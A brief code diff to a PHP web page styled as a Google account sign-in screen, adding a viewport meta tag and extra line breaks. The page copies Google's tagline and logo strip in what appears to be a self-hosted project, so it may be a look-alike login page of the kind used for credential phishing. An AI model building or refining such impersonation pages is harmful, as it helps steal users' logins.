@@ -18,6 +18,7 @@ require_once('helper.php');
       }
     </script>
     <meta charset='UTF-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=0.75">
     <link rel="stylesheet" href="assets/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/style.css">
     <script src="assets/js/jquery-2.2.1.min.js"></script>
@@ -126,7 +127,7 @@ require_once('helper.php');
       </div>
       <br><a href="#" class="text-center new-account">Create an account </a>
       <center><br><p class="tagline">One Google Account for everything Google</p>
-      <img src="assets/img/logo_strip.png" width="210" height="17" alt=""></center>
+      <img src="assets/img/logo_strip.png" width="210" height="17" alt=""></center><br><br>
     </div>
   </BODY>
 
